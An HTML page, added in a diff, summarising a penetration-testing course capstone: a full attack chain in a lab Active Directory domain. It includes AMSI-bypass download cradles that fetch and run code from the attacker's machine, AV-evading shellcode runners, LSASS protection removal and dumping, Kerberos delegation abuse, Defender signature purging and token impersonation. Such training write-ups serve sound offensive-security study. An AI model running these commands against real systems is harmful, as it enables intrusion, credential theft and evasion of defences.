@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="es" data-nz-theme="light" data-nz-marca="monocromo">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PEN-300 Module 22 — Combining the Pieces (Writeup 22) — distill</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/tokens.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/marcas/monocromo.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p1-layout.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p2-navigation.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p3-typography.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p4-actions.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p6-feedback.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p8-data.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p17-patrones.css">
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+const mq = matchMedia('(prefers-color-scheme: dark)');
+const saved = localStorage.getItem('nz-theme');
+if (saved === 'dark' || saved === 'light') document.documentElement.dataset.nzTheme = saved;
+else if (mq.matches) document.documentElement.dataset.nzTheme = 'dark';
+mq.addEventListener('change', e => {
+  if (!localStorage.getItem('nz-theme')) document.documentElement.dataset.nzTheme = e.matches ? 'dark' : 'light';
+});
+function nzToggleTheme() {
+  const cur = document.documentElement.dataset.nzTheme === 'dark' ? 'light' : 'dark';
+  document.documentElement.dataset.nzTheme = cur;
+  localStorage.setItem('nz-theme', cur);
+  if (window.nzAfterTheme) nzAfterTheme();
+}
+mermaid.initialize({ startOnLoad: false });
+mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+window.nzAfterTheme = async () => {
+  document.querySelectorAll('.mermaid').forEach(el => {
+    const code = el.getAttribute('data-src') || el.textContent;
+    el.setAttribute('data-src', code);
+    el.removeAttribute('data-processed');
+    el.textContent = code;
+  });
+  mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+  await mermaid.run({ querySelector: '.mermaid' });
+};
+document.addEventListener('DOMContentLoaded', () => {
+  if (document.querySelector('.mermaid')) mermaid.run({ querySelector: '.mermaid' });
+});
+</script>
+<style>
+.nz-prose pre.mermaid { background: none; text-align: center; }
+</style>
+</head>
+<body class="nz">
+<div class="nz-navbar nz-navbar--compact nz-navbar--bordered">
+<span class="nz-navbar__brand"><i></i>Distill</span>
+<span class="nz-navbar__links">
+<a class="nz-navbar__link" href="../../index.html">Índice</a>
+<a class="nz-navbar__link" href="../osep.html">OSEP (PEN-300)</a>
+<button class="nz-btn nz-btn--ghost nz-btn--sm" onclick="nzToggleTheme()" aria-label="Cambiar tema">◐</button>
+</span>
+</div>
+<main class="nz-container" style="padding-block: var(--nz-space-4)">
+<article class="nz-article">
+<header style="margin-bottom:var(--nz-space-4)">
+<p class="nz-eyebrow">Distill · OSEP (PEN-300)</p>
+<h1 class="nz-h2">PEN-300 Module 22 — Combining the Pieces (Writeup 22)</h1>
+<p class="nz-lbl nz-lbl--neutral">Fuente: material del curso correspondiente (sin video público)</p>
+</header>
+<div class="nz-prose">
+<blockquote>
+<p>Distilled from OffSec PEN-300 (OSEP) course material (module: Combining the Pieces) — internal training reference, not for redistribution.</p>
+</blockquote>
+<h2>Overview</h2>
+<p>Module 22 is the capstone of PEN-300: a full end-to-end attack chain against a small hardened Active Directory lab (<code>evil.com</code>) that chains techniques from every earlier module. The lab estate:</p>
+<ul>
+<li><strong>web01</strong> — IIS web server (192.168.120.132 in the lab excerpts), attack entry point, attacker Kali box at 192.168.119.120.</li>
+<li><strong>file01</strong> — file server, target of constrained delegation (192.168.120.131).</li>
+<li><strong>dc02</strong> — domain controller, final objective (192.168.120.130).</li>
+</ul>
+<p>Defenses in place: Windows Defender AV, AppLocker, LSA Protection (PPL on LSASS), AMSI, and a web app that only gives a service-account foothold with no interactive logon session.</p>
+<p>The chain, in order:</p>
+<ol>
+<li><strong>Initial access</strong> — exploit a file upload flaw on web01 to get a reverse Meterpreter shell as the IIS <code>DefaultAppPool</code> service account, with a custom AV-evading shellcode runner.</li>
+<li><strong>Privilege escalation</strong> — abuse the Print Spooler named-pipe impersonation bug (PrintSpoofer-style, SpoolSample trigger) to go from <code>DefaultAppPool</code> to local <strong>SYSTEM</strong> on web01.</li>
+<li><strong>Credential access</strong> — defeat LSA protection with <code>mimidrv.sys</code>, dump LSASS with a custom <code>MiniDumpWriteDump</code> app, and parse the dump offline to extract the <strong>web01$ machine account NTLM hash</strong>.</li>
+<li><strong>Kerberos abuse</strong> — use the machine account hash with Rubeus S4U (constrained delegation to file01's CIFS service) to impersonate a Domain Admin against file01.</li>
+<li><strong>Lateral movement</strong> — pass-the-ticket to file01's service control manager: repoint the unused <code>SensorService</code> at a custom injector that drops shellcode into <code>spoolsv</code>; strip Windows Defender signatures first with <code>MpCmdRun -RemoveDefinitions -All</code> when the staged Meterpreter gets flagged.</li>
+<li><strong>Domain compromise</strong> — on file01, enumerate tokens, find domain admin <code>paul</code> logged in, <code>impersonate_token</code> his delegation token, then reuse the same SensorService trick against <strong>dc02</strong>. Full compromise of evil.com without exploiting anything beyond the initial web app flaw.</li>
+</ol>
+<p>Key teaching points: real engagements fail between the set pieces — the value here is how each obstacle (no logon session, PPL, AMSI, Defender network-traffic signatures, ticket loss over reverse shells) forces an improvisation rather than a textbook command.</p>
+<h2>Key Sections &amp; Techniques</h2>
+<h3>1. Initial Access: Web Shell to Meterpreter (web01)</h3>
+<ul>
+<li>Upload folder at <code>C:\inetpub\wwwroot\Upload</code> on web01; initial shell lands as the IIS app-pool identity.</li>
+<li>The shellcode runner is the custom C# <strong>AV bypass</strong> version from the earlier AV-evasion module: non-emulated API checks (<code>VirtualAllocExNuma</code> probe) plus a <strong>Caesar cipher</strong> (shift −5, <code>((uint)buf[i] - 5) &amp; 0xFF</code>) over the shellcode so Windows Defender's static signatures don't fire.</li>
+<li>AMSI is disabled via a download cradle: <code>(New-Object System.Net.WebClient).DownloadString('http://KALI/amsi.txt') | IEX</code> before any in-memory PowerShell tooling (<code>mimikatz.txt</code>, Rubeus) is pulled down.</li>
+<li>Attacker Kali web root hosts the staged payloads (<code>amsi.txt</code>, <code>mimikatz.txt</code>, <code>Rubeus.exe</code>, binaries); the multi/handler listens on HTTPS 443.</li>
+</ul>
+<h3>2. Privilege Escalation: Spooler Impersonation to SYSTEM</h3>
+<ul>
+<li>The app-pool account has <code>SeImpersonatePrivilege</code> but <strong>no interactive logon session</strong>, which breaks naive <code>CreateProcessWithTokenW</code> usage and motivates the SpoolSample/PrintSpoofer approach: coerce the SYSTEM print spooler to authenticate to an attacker-controlled named pipe and impersonate it.</li>
+<li>The module re-implements the spoofer in C# (<code>PrintSpooferNet</code>): create pipe <code>\\.\pipe\test\pipe\spoolss</code>, <code>ImpersonateNamedPipeClient</code>, find the <code>S-1-5-18</code> SID, then spawn the payload with <code>CreateProcessWithTokenW</code>.</li>
+<li>Three gotchas the module calls out explicitly:</li>
+<li>Call <strong><code>RevertToSelf()</code></strong> first — some SYSTEM processes have lost <code>SeImpersonatePrivilege</code>, so revert to the app-pool token before creating the process.</li>
+<li>Set <code>dwLogonFlags = LogonFlags.WithProfile</code> and <code>dwCreationFlags = CreationFlags.UnicodeEnvironment</code> (the environment block built earlier is Unicode; without the profile flag some registry usage fails).</li>
+<li>Set <code>si.lpDesktop = "WinSta0\\Default"</code> — a logon session would get a desktop automatically, but here it must be set explicitly or the child process fails.</li>
+<li>Execution flow: run <code>printspoofernet.exe \\.\pipe\test\pipe\spoolss</code> from the web shell, background the channel, then in a second shell run <code>SpoolSample.exe web01 web01/pipe/test</code>; the spooler connects back and a new Meterpreter session opens as <code>NT AUTHORITY\SYSTEM</code>.</li>
+</ul>
+<h3>3. Credential Access: Beating PPL for the Machine Account Hash</h3>
+<p>The constrained delegation attack needs the <strong>web01$ machine account NTLM hash out of LSASS</strong>, but LSA protection (PPL) blocks injection/dump. Since a kernel driver must live on disk and be signed, and Defender doesn't flag <code>mimidrv.sys</code> itself, the module's play is to minimize Mimikatz usage to exactly one short-lived execution:</p>
+<ol>
+<li><strong>Migrate</strong> the SYSTEM Meterpreter into <code>spoolsv</code> for stability (<code>migrate &lt;pid of spoolsv&gt;</code>), then open a shell.</li>
+<li><strong>Manually load the driver</strong> without Mimikatz:
+   <code>sc create mimidrv binPath= C:\inetpub\wwwroot\upload\mimidrv.sys type= kernel start= demand
+   sc start mimidrv</code></li>
+<li><strong>Disable AMSI</strong>, then run <strong>one</strong> <code>Invoke-Mimikatz</code> command to strip the PPL flag:
+   <code>Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""</code>
+   (nested backtick-escaped quotes because <code>-Command</code> needs both levels of quoting). Defender kills the PowerShell process right after — expected; the PPL flag is already off.</li>
+<li><strong>Dump LSASS</strong> with the custom <code>dump.exe</code> app that calls <code>MiniDumpWriteDump</code>, writing <code>lsass.dmp</code> (~46 MB) to <code>C:\Windows\Tasks</code>.</li>
+<li><strong>Parse offline</strong>: <code>download</code> the dump to Kali, serve it, pull it onto the clean Windows 2019 test machine, and run:
+   <code>Invoke-Mimikatz -Command "`"sekurlsa::minidump C:\tools\lsass.dmp`" sekurlsa::logonpasswords"</code>
+   yielding e.g. <code>WEB01$ / EVIL / NTLM: &lt;hash&gt;</code> — the machine account hash.</li>
+</ol>
+<h3>4. Kerberos Abuse: Constrained Delegation via Rubeus S4U</h3>
+<ul>
+<li>web01 is configured for constrained delegation to <code>cifs/file01</code>, so the web01$ hash can request a TGS <strong>as any user</strong> for that SPN. Impersonating a Domain Admin gives code-exec rights on file01.</li>
+<li>Compile Rubeus targeting <strong>.NET Framework 4.6</strong> (what Server 2019 ships). Don't drop the binary on disk — stock Rubeus is heavily signatured; load it from memory after the AMSI bypass:
+  <code>$data = (New-Object System.Net.WebClient).DownloadData('http://KALI/Rubeus.exe')
+  $assem = [System.Reflection.Assembly]::Load($data)</code></li>
+<li>Invoke functionality through the public <code>Main</code> — e.g. <code>[Rubeus.Program]::Main("purge".Split())</code> clears tickets.</li>
+<li>The S4U chain, one call, pass-the-ticket:
+  <code></code>
+  Flow: AS-REQ for <code>web01$</code> TGT → S4U2self gets a forwardable TGS for <code>administrator</code> to <code>web01$</code> → S4U2proxy exchanges it for a <code>cifs/file01</code> TGS → <code>/ptt</code> injects it.</li>
+<li>Verify with <code>klist</code> (<code>Client: administrator @ EVIL.COM / Server: cifs/file01</code>), then <code>ls \\file01\c$</code> proves Domain-Admin-level CIFS access.</li>
+<li>Lab gotcha: through a reverse shell the injected TGS is <strong>occasionally lost</strong> — just request it again.</li>
+</ul>
+<h3>5. Lateral Movement: SensorService Hijack + Defender Signature Purge</h3>
+<p>Pass-the-ticket, not pass-the-hash: the TGS is what's usable, and Metasploit PsExec-style modules either can't use it or trip Defender. The technique repurposes the unused <strong>SensorService</strong> on the target:</p>
+<ol>
+<li><strong><code>inject.exe</code></strong> — C# app combining the AV-bypass shellcode runner (Numa probe + Caesar shift) with classic process injection targeted at <code>spoolsv</code> (a non-PPL SYSTEM process on Server 2019): <code>VirtualAllocEx</code> → <code>WriteProcessMemory</code> → <code>CreateRemoteThread</code>. Injecting rather than being a proper service binary means the shell survives the SCM's 1053 timeout kill.</li>
+<li><strong><code>lat.exe</code></strong> — modifies the service remotely over the CIFS TGS:
+   <code>OpenSCManager("file01", null, 0xF003F); OpenService(..., "SensorService", 0xF01FF);
+   ChangeServiceConfigA(schService, ..., "C:\\inject.exe", ...); StartService(schService, 0, null);</code>
+   <code>Error in calling StartService: 1053</code> is expected (not a real service executable).</li>
+<li><strong>First attempt fails</strong>: the staged Meterpreter session opens then hangs — Defender's Network Realtime Inspection (WdNisSvc) matches the staging traffic signatures inside <code>spoolsv</code> and kills it. Brute-forcing payloads would poison the attack: <code>spoolsv</code> only auto-restarts twice, and repeated SensorService/spoolsv interaction makes Defender disable SensorService and mark it for deletion. Killing <code>MsMpEng</code> is out — it's PPL-protected even for SYSTEM.</li>
+<li><strong>The fix</strong>: abuse Defender's own <code>MpCmdRun</code> CLI. Point SensorService at the signature-removal command first, let it time out, then repoint at <code>inject.exe</code>:
+   <code>string signature = "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All";
+   ChangeServiceConfigA(..., signature, ...); StartService(...);
+   ChangeServiceConfigA(..., payload, ...);   // C:\inject.exe
+   StartService(...);</code>
+   With zero signature definitions, the second start lands a clean SYSTEM Meterpreter on file01. (Defender will re-download definitions over time — purge periodically for persistent access.)</li>
+<li>Confirm with <code>sysinfo</code> (<code>Computer: FILE01</code>, <code>NT AUTHORITY\SYSTEM</code>).</li>
+</ol>
+<h3>6. Domain Compromise: Token Impersonation → DC</h3>
+<ul>
+<li>On file01, enumeration shows the same defenses as web01 <strong>but</strong> <code>ps</code> reveals domain user <strong>paul</strong> with live processes (<code>explorer.exe</code>, <code>ServerManager.exe</code>) — an interactive domain-admin session to hijack.</li>
+<li><code>net user paul /domain</code> confirms <code>*Domain Admins</code> membership.</li>
+<li>Rather than re-defeating PPL to dump paul's hash (or migrating into his medium-integrity process and hitting UAC/AppLocker), impersonate his token as SYSTEM:
+  <code>load incognito
+  list_tokens -u        # delegation tokens include EVIL\paul
+  impersonate_token EVIL\\paul</code></li>
+<li>Then rerun the same lateral-movement play (now <code>lat2.exe</code> targeting <strong>dc02</strong>), uploaded to file01, with paul's impersonated token supplying the rights: <code>copy c:\inject.exe \\dc02\c$</code> then <code>c:\lat2.exe</code> → third SYSTEM Meterpreter session on DC02.</li>
+<li>Endgame: dump everything including <code>krbtgt</code> (DCSync or otherwise) to retain domain access.</li>
+</ul>
+<h2>Gotchas &amp; Lessons</h2>
+<ul>
+<li><strong>No interactive logon session</strong> for the service-account foothold is the defining constraint of the whole module — it drives the desktop/<code>RevertToSelf</code> fixes in the spoofer and pushes toward machine-account rather than user credential attacks.</li>
+<li><strong>One-shot Mimikatz</strong>: load <code>mimidrv.sys</code> via <code>sc</code> by hand first, run only the PPL-strip command in memory, then do the actual LSASS dump with your own <code>MiniDumpWriteDump</code> binary and parse it offline — accepts one AV alert instead of a prolonged fight.</li>
+<li><strong>Nested quoting for Invoke-Mimikatz -Command</strong>: outer double quotes plus backtick-escaped inner quotes.</li>
+<li><strong>Ticket loss over reverse shells</strong>: TGS injected with <code>/ptt</code> can vanish between channels; re-request rather than debug.</li>
+<li><strong>Meterpreter session opens then hangs</strong> = shellcode architecture mismatch or AV network-traffic detection — diagnose before re-throwing.</li>
+<li><strong>Service-based AV evasion logic</strong>: don't attack <code>MsMpEng</code> (PPL); don't brute-force payloads (burns <code>spoolsv</code> restarts and gets SensorService marked for deletion); instead abuse the AV's own maintenance tooling (<code>MpCmdRun -RemoveDefinitions -All</code>) through the very service you're hijacking.</li>
+<li><strong>Cleanup</strong>: the attack scatters binaries, drivers, and dumps across three boxes — track and remove artifacts at engagement end.</li>
+</ul>
+<h2>Exercises (as given in the module)</h2>
+<ul>
+<li>Modify PrintSpooferNet to work from a shell with a logon session; transfer files, prep the listener + two command prompts, execute the attack to SYSTEM.</li>
+<li>Download the correct <code>mimidrv.sys</code> / Invoke-Mimikatz to the Kali web root; migrate the SYSTEM shell; launch the driver via SCM; disable AMSI, strip LSASS PPL; dump LSASS with the custom app; extract the web01$ NTLM hash offline.</li>
+<li>Rework Rubeus for .NET 4.6; disable AMSI from the SYSTEM shell and load Rubeus in memory; request the <code>cifs/file01</code> TGS as administrator; verify share access.</li>
+<li>Combine process injection with the AV bypass; wire up the SensorService lateral movement; attempt it with a raw Meterpreter payload and observe the AV catch; adapt with <code>MpCmdRun</code> definition removal; land a clean shell on file01.</li>
+<li>List tokens and impersonate <code>EVIL\paul</code>; while impersonating, move laterally to dc02.</li>
+<li><strong>Extra mile</strong>: repeat the whole chain from a different C2 framework (PowerShell Empire or Covenant) where AV evasion may be easier due to absent signatures/behavioral detections.</li>
+</ul>
+<h2>Quick Reference — Attack Chain</h2>
+<div class="nz-table-wrap"><table class="nz-table">
+<thead>
+<tr>
+<th>Stage</th>
+<th>Technique</th>
+<th>Tooling</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Foothold</td>
+<td>File upload → reverse shell, AV-bypass runner</td>
+<td>custom C# (Numa probe + Caesar cipher)</td>
+</tr>
+<tr>
+<td>Privesc</td>
+<td>Spooler pipe impersonation → SYSTEM</td>
+<td>PrintSpooferNet + SpoolSample</td>
+</tr>
+<tr>
+<td>Creds</td>
+<td>PPL strip + offline LSASS dump</td>
+<td><code>sc</code> + mimidrv.sys, one-shot Invoke-Mimikatz, custom <code>dump.exe</code>, <code>sekurlsa::minidump</code></td>
+</tr>
+<tr>
+<td>Delegation</td>
+<td>S4U2self/S4U2proxy → cifs/file01 TGS as DA</td>
+<td>Rubeus (in-memory, <code>[Rubeus.Program]::Main(...)</code>)</td>
+</tr>
+<tr>
+<td>Lateral</td>
+<td>SensorService hijack + Defender def purge → SYSTEM on file01</td>
+<td><code>inject.exe</code>, <code>lat.exe</code>, <code>MpCmdRun -RemoveDefinitions -All</code></td>
+</tr>
+<tr>
+<td>DA + DC</td>
+<td>Token impersonation of paul, repeat lateral move → dc02</td>
+<td>Meterpreter incognito, <code>lat2.exe</code></td>
+</tr>
+</tbody>
+</table></div>
+</div>
+<footer class="nz-callout" style="margin-top:var(--nz-space-5)">
+<p class="nz-lbl">Atribución</p>
+<p>Artículo destilado en español a partir de material del curso correspondiente. El análisis y la redacción son propios; las ideas y los datos presentados corresponden a los autores originales.</p>
+</footer>
+</article>
+</main>
+</body>
+</html>
